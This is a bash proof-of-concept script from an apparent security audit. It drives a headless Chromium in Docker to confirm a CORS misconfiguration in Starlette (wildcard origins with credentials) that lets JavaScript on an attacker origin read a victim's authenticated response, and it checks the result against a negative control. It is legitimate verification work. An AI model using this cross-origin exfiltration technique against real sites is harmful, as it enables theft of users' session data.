#!/usr/bin/env bash
# poc_14_cors_exfil_browser.sh — Chain B Step 3 LIVE-OBSERVED via real headless Chromium
#
# ── What this PoC proves ───────────────────────────────────────────────────────
#
#   Converts poc_13 Chain B Step 3 from BROWSER-MODELED to LIVE-OBSERVED.
#   A REAL headless Chromium browser:
#     (1) Establishes a victim session at https://secure-target:8443/cors-protected/login
#         (Option A) or uses a seeded SameSite=None;Secure cookie (Option B fallback).
#     (2) Navigates to the attacker page at https://attacker-origin:8443/attacker.html.
#     (3) Issues fetch("https://secure-target:8443/cors-protected/whoami",{credentials:"include"})
#         — a genuine cross-origin credentialed request.
#     (4) Starlette's CORSMiddleware reflects Access-Control-Allow-Origin: https://attacker-origin:8443
#         + Access-Control-Allow-Credentials: true (starlette/middleware/cors.py:167-168 → :177-178).
#     (5) The browser RELEASES the victim's authenticated body (AUTOFYN_CORS_EXFIL_SECRET)
#         to attacker-origin JS — attacker reads it cross-origin.
#   NEGATIVE CONTROL (LIVE-OBSERVED): the same attacker JS is BLOCKED by browser SOP
#   from reading https://secure-target:8443/no-cors-here (cookie-gated, NOT behind the
#   wildcard+credentials CORS sub-app) — proven by a thrown TypeError in the browser.
#
# ── PRECONDITION (stated prominently — do NOT overstate) ─────────────────────
#
#   CONFIGURATION-DEPENDENT.  Exploitable ONLY when:
#     (a) The API session cookie is SameSite=None; Secure (cross-site cookie precondition).
#     (b) The API is served over HTTPS (required for Secure cookie attachment).
#     (c) The developer set CORSMiddleware(allow_origins=["*"], allow_credentials=True).
#         Both Starlette defaults are SAFE.  NOT a default-config exploit.
#     (d) The victim holds an active authenticated session and visits the attacker page.
#   This PoC makes preconditions (a) and (b) REAL by adding /cors-protected/login
#   (Set-Cookie: SameSite=None; Secure) and fronting the target with a TLS proxy.
#
# ── PASS/FAIL semantics ───────────────────────────────────────────────────────
#   FAIL = Chain B Step 3 LIVE-OBSERVED (real Chromium read = confirmed finding).
#   PASS = some condition was not satisfied; see detail for which gate failed.
#   THIS POC IS EXPECTED TO FAIL (FINDING = CONFIRMED).
#
# ── NOT in run_all.sh curl loop ───────────────────────────────────────────────
#   This PoC requires Docker + the browser sidecar.  run_all.sh explicitly skips
#   poc_14_* scripts.  Invoke separately:
#     bash autofyn_audit/pocs/poc_14_cors_exfil_browser.sh <BASE_URL>
#   where BASE_URL is the target base URL visible from inside the Docker network
#   (e.g. http://autofyn-audit-target:8000) — used only for the guard curl checks;
#   the browser sidecar itself resolves secure-target:8443 internally.
#
# ── Browser sidecar topology ─────────────────────────────────────────────────
#   Image:   mcr.microsoft.com/playwright@sha256:0fc07c73230cb7c376a528d7ffc83c4bdcdcd3fc7efbe54a2eed72b1ec118377
#   Network: autofyn-audit-net
#   Aliases: --network-alias attacker-origin --network-alias secure-target
#   Node:    PLAYWRIGHT_BROWSERS_PATH=/ms-playwright (reuses baked chromium_headless_shell-1148)
#   Browser: playwright@1.49.0 (version-matched to baked image)
#
# ── Marker isolation ────────────────────────────────────────────────────────
#   AUTOFYN_NOCORS_CONTROL_SECRET — negative-control marker; distinct from all
#     prior PoC markers; never in any docstring → never in /openapi.json.
#   AUTOFYN_BROWSER_POC14         — HTML comment; never in /openapi.json.
#   AUTOFYN_CORS_EXFIL_SECRET     — positive marker (shared with poc_13).
#
set -euo pipefail

# ── Fail-fast: Docker must be available ───────────────────────────────────────
if ! command -v docker >/dev/null 2>&1; then
    echo "[ERROR] poc_14 requires Docker but 'docker' is not found in PATH."
    echo "        This PoC runs separately from the curl suite.  See header comment."
    exit 1
fi

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=../lib/pins.sh
source "${SCRIPT_DIR}/../lib/pins.sh"
# shellcheck source=../lib/common.sh
source "${SCRIPT_DIR}/../lib/common.sh"

BASE_URL="${1:?Base URL required as \$1 (e.g. http://autofyn-audit-target:8000)}"

# Guard against stray invocations missing a sidecar-reachable URL
if printf '%s\n' "${BASE_URL}" | grep -Eq '^http://127\.' || \
   printf '%s\n' "${BASE_URL}" | grep -Eq '^http://localhost'; then
    echo "[WARN] BASE_URL '${BASE_URL}' looks like a loopback address."
    echo "       poc_14 runs from inside a Docker sidecar and needs a URL"
    echo "       reachable from within the autofyn-audit-net Docker network"
    echo "       (e.g. http://autofyn-audit-target:8000)."
fi

BROWSER_DIR="${SCRIPT_DIR}/browser"
ATTACKER_ORIGIN="https://attacker-origin:8443"
WHOAMI_URL="${BASE_URL}/cors-protected/whoami"
NOCORS_URL="${BASE_URL}/no-cors-here"
VICTIM_COOKIE="session=AUTOFYN_VICTIM_SESSION_b41d2e"

echo "=== poc_14: Chain B Step 3 LIVE-OBSERVED via real headless Chromium ==="
echo "Endpoint   : ${WHOAMI_URL} (positive)"
echo "             ${NOCORS_URL} (negative control)"
echo "Attacker   : ${ATTACKER_ORIGIN}"
echo "Sink       : starlette/middleware/cors.py:167-168 → :177-178 (ACAO reflection + ACAC:true)"
echo "Precondition:"
echo "  - Session cookie SameSite=None; Secure (cross-site cookie + HTTPS transport)"
echo "  - CORSMiddleware(allow_origins=['*'], allow_credentials=True)"
echo "    (both Starlette defaults SAFE; NOT default-config exploit)"
echo "Playwright : mcr.microsoft.com/playwright@${PLAYWRIGHT_IMAGE_DIGEST}"
echo "             (playwright@${PLAYWRIGHT_VERSION}, reuses baked chromium_headless_shell-1148)"
echo "Severity   : MEDIUM-conditional — reinforces finding 5 / Chain B (poc_13)"
echo "Expected   : FAIL (Chain B Step 3 LIVE-OBSERVED = confirmed finding)"
echo "Note       : poc_14 is NOT part of the run_all.sh curl suite (6 PASS + 8 FAIL unchanged)"
echo ""

# ─────────────────────────────────────────────────────────────────────────────
# Pre-flight curl gates (run from wherever this script is invoked)
# Gate 1: /cors-protected/login sets SameSite=None; Secure cookie
# Gate 2: /no-cors-here emits NO Access-Control-Allow-Origin (not CORS-wrapped)
# Gate 3: /no-cors-here is genuinely session-gated (401 without cookie)
# ─────────────────────────────────────────────────────────────────────────────
echo "──────────────────────────────────────────────────────────────────────────────"
echo "Pre-flight curl gates (target smoke-test)"
echo "──────────────────────────────────────────────────────────────────────────────"

PREFLIGHT_OK=1

# Gate 1: /cors-protected/login → Set-Cookie with SameSite=None; Secure
echo "--- Gate 1: /cors-protected/login → expect Set-Cookie SameSite=None; Secure ---"
LOGIN_HDRS="$(curl -sS -D - -o /dev/null --max-time 10 \
    "${BASE_URL}/cors-protected/login" 2>&1 || echo "CURL_FAILED")"
LOGIN_LC="$(printf '%s' "${LOGIN_HDRS}" | tr '[:upper:]' '[:lower:]')"
if assert_contains "${LOGIN_LC}" "set-cookie" && \
   assert_contains "${LOGIN_LC}" "samesite=none" && \
   assert_contains "${LOGIN_LC}" "secure"; then
    echo "[OK] Gate 1: /cors-protected/login sets SameSite=None; Secure cookie."
else
    echo "[FAIL] Gate 1: /cors-protected/login did not set SameSite=None; Secure cookie."
    printf '%s\n' "${LOGIN_HDRS}"
    PREFLIGHT_OK=0
fi
echo ""

# Gate 2: /no-cors-here + Origin → NO Access-Control-Allow-Origin (hard gate)
echo "--- Gate 2: /no-cors-here + Origin: ${ATTACKER_ORIGIN} → expect NO ACAO ---"
NOCORS_HDRS="$(curl -sS -D - -o /dev/null --max-time 10 \
    -H "Origin: ${ATTACKER_ORIGIN}" \
    -H "Cookie: ${VICTIM_COOKIE}" \
    "${NOCORS_URL}" 2>&1 || echo "CURL_FAILED")"
NOCORS_LC="$(printf '%s' "${NOCORS_HDRS}" | tr '[:upper:]' '[:lower:]')"
if assert_not_contains "${NOCORS_LC}" "access-control-allow-origin"; then
    echo "[OK] Gate 2: /no-cors-here emits NO Access-Control-Allow-Origin — not CORS-wrapped."
else
    echo "[FAIL] Gate 2: /no-cors-here emitted Access-Control-Allow-Origin — negative control"
    echo "       is CORS-wrapped; cannot isolate CORS reflection as the cause of positive read."
    printf '%s\n' "${NOCORS_HDRS}"
    PREFLIGHT_OK=0
fi
echo ""

# Gate 3: /no-cors-here 401 without cookie → genuinely session-gated
echo "--- Gate 3: /no-cors-here (no cookie) → expect HTTP 401 ---"
NOCORS_CODE="$(curl -sS -o /dev/null -w "%{http_code}" --max-time 10 \
    "${NOCORS_URL}" 2>&1 || echo "000")"
if [[ "${NOCORS_CODE}" == "401" ]]; then
    echo "[OK] Gate 3: /no-cors-here is session-gated (401 without cookie)."
else
    echo "[FAIL] Gate 3: /no-cors-here returned HTTP ${NOCORS_CODE} without cookie — not gated."
    PREFLIGHT_OK=0
fi
echo ""

if [[ "${PREFLIGHT_OK}" != "1" ]]; then
    echo "[ERROR] Pre-flight gate(s) failed — cannot assess browser PoC."
    print_check "cors_exfil_browser_observed" "PASS" \
        "cannot assess (pre-flight gate failed: check /cors-protected/login Set-Cookie or /no-cors-here isolation)"
    exit 0
fi

echo "[OK] All pre-flight gates passed."
echo ""

# ─────────────────────────────────────────────────────────────────────────────
# Browser sidecar setup
# ─────────────────────────────────────────────────────────────────────────────
echo "──────────────────────────────────────────────────────────────────────────────"
echo "Browser sidecar setup"
echo "──────────────────────────────────────────────────────────────────────────────"

assert_safe_resource_name container "${BROWSER_SIDECAR_NAME}"
assert_safe_resource_name network "${NETWORK_NAME}"

# Tear down any stale sidecar from a previous interrupted run
if docker ps -a --format '{{.Names}}' | grep -qx "${BROWSER_SIDECAR_NAME}"; then
    echo "[INFO] Removing stale sidecar '${BROWSER_SIDECAR_NAME}'..."
    docker rm -f "${BROWSER_SIDECAR_NAME}" >/dev/null 2>&1 || true
fi

echo "[INFO] Starting browser sidecar (playwright image by digest)..."
docker run -d --rm \
    --name "${BROWSER_SIDECAR_NAME}" \
    --network "${NETWORK_NAME}" \
    --network-alias attacker-origin \
    --network-alias secure-target \
    "mcr.microsoft.com/playwright@${PLAYWRIGHT_IMAGE_DIGEST}" \
    sleep infinity

echo "[INFO] Copying browser/ files into sidecar..."
docker cp "${BROWSER_DIR}/." "${BROWSER_SIDECAR_NAME}:/work/"

echo "[INFO] Installing playwright@${PLAYWRIGHT_VERSION} (skip browser download)..."
docker exec \
    -e "PLAYWRIGHT_BROWSERS_PATH=/ms-playwright" \
    -e "PLAYWRIGHT_SKIP_BROWSER_DOWNLOAD=1" \
    -w /work \
    "${BROWSER_SIDECAR_NAME}" \
    npm install --no-audit --no-fund 2>&1 | tail -5

echo "[INFO] npm install complete."
echo ""

# ─────────────────────────────────────────────────────────────────────────────
# Run the browser driver script
# ─────────────────────────────────────────────────────────────────────────────
echo "──────────────────────────────────────────────────────────────────────────────"
echo "Running browser_exfil.js (headless Chromium)"
echo "──────────────────────────────────────────────────────────────────────────────"

BROWSER_RESULT_LINE=""
BROWSER_HARNESS_OK=1

# Capture stdout (machine-readable) and stream stderr (human-readable diagnostics)
BROWSER_OUTPUT="$(docker exec \
    -e "PLAYWRIGHT_BROWSERS_PATH=/ms-playwright" \
    -w /work \
    "${BROWSER_SIDECAR_NAME}" \
    node browser_exfil.js 2>&1)" || {
    echo "[ERROR] browser_exfil.js exited with non-zero status."
    BROWSER_HARNESS_OK=0
}

echo "--- browser_exfil.js output ---"
printf '%s\n' "${BROWSER_OUTPUT}"
echo "--- end browser output ---"
echo ""

# Extract the machine-readable JSON line
BROWSER_RESULT_LINE="$(printf '%s\n' "${BROWSER_OUTPUT}" | \
    grep -E '^__BROWSER_RESULT__ ' | head -1 || echo "")"

if [[ -z "${BROWSER_RESULT_LINE}" ]]; then
    echo "[ERROR] No __BROWSER_RESULT__ line found in browser output."
    BROWSER_HARNESS_OK=0
fi

# ─────────────────────────────────────────────────────────────────────────────
# Parse and gate the browser result
# ─────────────────────────────────────────────────────────────────────────────
echo "──────────────────────────────────────────────────────────────────────────────"
echo "Parsing browser result"
echo "──────────────────────────────────────────────────────────────────────────────"

POSITIVE_READ=0
POSITIVE_BODY_HAS_SECRET=0
NEGATIVE_BLOCKED=0
NEGATIVE_THREW=0
ACAO_SEEN=""
ACAC_TRUE=0
SESSION_PATH="unknown"

if [[ "${BROWSER_HARNESS_OK}" == "1" ]] && [[ -n "${BROWSER_RESULT_LINE}" ]]; then
    RESULT_JSON="${BROWSER_RESULT_LINE#__BROWSER_RESULT__ }"

    # Parse JSON fields via node (already available in the environment)
    # Use inline node for robustness (no jq dependency assumed)
    _PARSE_SCRIPT='const r=JSON.parse(process.argv[1]);
const ks=["positive_read","positive_body_has_secret","negative_blocked","negative_threw","acac_true"];
for(const k of ks) process.stdout.write(k+"="+(r[k]?1:0)+"\n");
process.stdout.write("acao_seen="+(r.acao_seen||"")+"\n");
process.stdout.write("session_path="+(r.session_path||"unknown")+"\n");'

    PARSED="$(node -e "${_PARSE_SCRIPT}" "${RESULT_JSON}" 2>/dev/null || echo "")"

    if [[ -n "${PARSED}" ]]; then
        while IFS='=' read -r key val; do
            case "${key}" in
                positive_read)          POSITIVE_READ="${val}" ;;
                positive_body_has_secret) POSITIVE_BODY_HAS_SECRET="${val}" ;;
                negative_blocked)       NEGATIVE_BLOCKED="${val}" ;;
                negative_threw)         NEGATIVE_THREW="${val}" ;;
                acac_true)              ACAC_TRUE="${val}" ;;
                acao_seen)              ACAO_SEEN="${val}" ;;
                session_path)           SESSION_PATH="${val}" ;;
            esac
        done <<< "${PARSED}"

        echo "  positive_read            : ${POSITIVE_READ}"
        echo "  positive_body_has_secret : ${POSITIVE_BODY_HAS_SECRET}"
        echo "  acao_seen                : ${ACAO_SEEN}"
        echo "  acac_true                : ${ACAC_TRUE}"
        echo "  negative_blocked         : ${NEGATIVE_BLOCKED}"
        echo "  negative_threw           : ${NEGATIVE_THREW}"
        echo "  session_path             : ${SESSION_PATH}"
    else
        echo "[WARN] Could not parse browser result JSON."
        BROWSER_HARNESS_OK=0
    fi
fi

echo ""

# ─────────────────────────────────────────────────────────────────────────────
# Pass-through proof (anti-theater): browser-observed ACAO must match direct curl
# ─────────────────────────────────────────────────────────────────────────────
echo "──────────────────────────────────────────────────────────────────────────────"
echo "Pass-through proof: browser-observed ACAO vs direct curl to autofyn-audit-target:8000"
echo "──────────────────────────────────────────────────────────────────────────────"

if [[ -n "${ACAO_SEEN}" ]]; then
    DIRECT_HDRS="$(curl -sS -D - -o /dev/null --max-time 10 \
        -H "Origin: ${ACAO_SEEN}" \
        -H "Cookie: ${VICTIM_COOKIE}" \
        "${WHOAMI_URL}" 2>&1 || echo "CURL_FAILED")"
    DIRECT_LC="$(printf '%s' "${DIRECT_HDRS}" | tr '[:upper:]' '[:lower:]')"
    ACAO_SEEN_LC="$(printf '%s' "${ACAO_SEEN}" | tr '[:upper:]' '[:lower:]')"
    if assert_contains "${DIRECT_LC}" "access-control-allow-origin: ${ACAO_SEEN_LC}"; then
        echo "[OK] Pass-through proof: direct curl ACAO matches browser-observed ACAO."
        echo "     ACAO from Starlette directly: access-control-allow-origin: ${ACAO_SEEN}"
        echo "     CORS headers originate from Starlette, not the proxy."
    else
        echo "[WARN] Pass-through proof: direct curl ACAO does not match browser-observed ACAO."
        echo "       Browser ACAO: ${ACAO_SEEN}"
        echo "       Direct curl headers: $(printf '%s' "${DIRECT_HDRS}" | grep -i access-control || echo "(none)")"
        echo "       This may indicate a harness issue; reviewer should verify."
    fi
else
    echo "[SKIP] Pass-through proof skipped — no acao_seen from browser (positive arm did not fire)."
fi
echo ""

# ─────────────────────────────────────────────────────────────────────────────
# Sidecar teardown (always, before verdict)
# ─────────────────────────────────────────────────────────────────────────────
echo "──────────────────────────────────────────────────────────────────────────────"
echo "Teardown browser sidecar"
echo "──────────────────────────────────────────────────────────────────────────────"
assert_safe_resource_name container "${BROWSER_SIDECAR_NAME}"
docker rm -f "${BROWSER_SIDECAR_NAME}" >/dev/null 2>&1 || true
echo "[OK] Browser sidecar '${BROWSER_SIDECAR_NAME}' removed."
echo ""

# ─────────────────────────────────────────────────────────────────────────────
# LIVE-OBSERVED output block (per spec §6 label strings)
# ─────────────────────────────────────────────────────────────────────────────
echo "──────────────────────────────────────────────────────────────────────────────"
echo "OBSERVED / MODELED accounting"
echo "──────────────────────────────────────────────────────────────────────────────"
echo ""

if [[ "${SESSION_PATH}" == "login" ]]; then
    SESSION_LABEL="victim session established by browser navigating to /cors-protected/login (Option A — zero synthetic cookie injection)"
else
    SESSION_LABEL="victim session represented by an established SameSite=None;Secure cookie (Option B seeded fallback — the documented cross-site-cookie precondition)"
fi

if (( POSITIVE_READ == 1 )) && (( POSITIVE_BODY_HAS_SECRET == 1 )) && (( NEGATIVE_BLOCKED == 1 )) && (( NEGATIVE_THREW == 1 )); then
    echo "LIVE-OBSERVED: a real headless Chromium at attacker origin ${ATTACKER_ORIGIN}"
    echo "issued fetch(\"https://secure-target:8443/cors-protected/whoami\",{credentials:\"include\"}),"
    echo "the server reflected Access-Control-Allow-Origin: ${ACAO_SEEN} +"
    echo "Access-Control-Allow-Credentials: true (starlette/middleware/cors.py), and the browser"
    echo "RELEASED the victim's authenticated body to attacker JS, which read AUTOFYN_CORS_EXFIL_SECRET."
    echo "NEGATIVE CONTROL (LIVE-OBSERVED): the same attacker JS was BLOCKED by SOP from reading the"
    echo "cookie-gated /no-cors-here endpoint (not under the wildcard+credentials CORS sub-app)"
    echo "— proven by a thrown TypeError in the browser (negative_threw=true)."
    echo "PRECONDITION: ${SESSION_LABEL};"
    echo "session cookie SameSite=None; Secure over HTTPS (documented cross-site cookie);"
    echo "allow_origins=['*']+allow_credentials=True (both Starlette defaults safe; NOT default-config)."
else
    echo "Browser scenario result: POSITIVE_READ=${POSITIVE_READ} POSITIVE_BODY_HAS_SECRET=${POSITIVE_BODY_HAS_SECRET}"
    echo "                         NEGATIVE_BLOCKED=${NEGATIVE_BLOCKED} NEGATIVE_THREW=${NEGATIVE_THREW}"
fi
echo ""

# ─────────────────────────────────────────────────────────────────────────────
# Final verdict
# ─────────────────────────────────────────────────────────────────────────────
echo "──────────────────────────────────────────────────────────────────────────────"
echo "Final verdict"
echo "──────────────────────────────────────────────────────────────────────────────"

if [[ "${BROWSER_HARNESS_OK}" != "1" ]]; then
    print_check "cors_exfil_browser_observed" "PASS" \
        "cannot assess (browser harness unavailable — docker/npm/launch failure; no exploit claim)"
    exit 0
fi

if (( POSITIVE_READ == 1 )) && (( POSITIVE_BODY_HAS_SECRET == 1 )) && \
   (( NEGATIVE_BLOCKED == 1 )) && (( NEGATIVE_THREW == 1 )) && \
   (( ACAC_TRUE == 1 )) && [[ -n "${ACAO_SEEN}" ]]; then
    # All gates passed — Chain B Step 3 LIVE-OBSERVED
    print_check "cors_exfil_browser_observed" "FAIL" \
        "Chain B Step 3 LIVE-OBSERVED with real headless Chromium — attacker-origin JS (${ACAO_SEEN}) read the victim's authenticated /cors-protected/whoami body (AUTOFYN_CORS_EXFIL_SECRET) cross-origin via fetch(credentials:include); Starlette reflected ACAO=${ACAO_SEEN} + ACAC:true (starlette/middleware/cors.py:167-168 to :177-178); negative control proved SOP BLOCKS the same read against the non-CORS-wrapped /no-cors-here endpoint (threw TypeError); session-path=${SESSION_PATH}; precondition session cookie SameSite=None;Secure over HTTPS + allow_origins=['*']+allow_credentials=True (both Starlette defaults safe; NOT default-config); upstream-inherited; reinforces finding 5 / Chain B (poc_13)"
    exit 0
fi

if (( POSITIVE_READ == 1 )) && (( POSITIVE_BODY_HAS_SECRET == 1 )) && \
   (( NEGATIVE_BLOCKED != 1 )); then
    print_check "cors_exfil_browser_observed" "PASS" \
        "inconclusive: positive cross-origin read succeeded but negative control did NOT throw TypeError (negative_threw=${NEGATIVE_THREW}); cannot attribute the positive read specifically to the CORS reflection — SOP may not have been enforced on the /no-cors-here control"
    exit 0
fi

if (( ACAO_SEEN == 0 )) || [[ -z "${ACAO_SEEN}" ]] || (( ACAC_TRUE != 1 )); then
    print_check "cors_exfil_browser_observed" "PASS" \
        "Chain B Step 3 not confirmed — browser did not observe ACAO+ACAC:true (acao_seen='${ACAO_SEEN}' acac_true=${ACAC_TRUE}); CORS reflection may not have fired"
    exit 0
fi

# Generic fallback — diagnose which arm failed
FAIL_DETAIL="Chain B Step 3 not confirmed:"
if (( POSITIVE_READ != 1 )); then
    FAIL_DETAIL="${FAIL_DETAIL} positive cross-origin read did not succeed;"
fi
if (( POSITIVE_BODY_HAS_SECRET != 1 )); then
    FAIL_DETAIL="${FAIL_DETAIL} AUTOFYN_CORS_EXFIL_SECRET absent from positive body;"
fi
if (( NEGATIVE_THREW != 1 )); then
    FAIL_DETAIL="${FAIL_DETAIL} negative control did not throw TypeError (negative_threw=${NEGATIVE_THREW});"
fi
print_check "cors_exfil_browser_observed" "PASS" "${FAIL_DETAIL}"
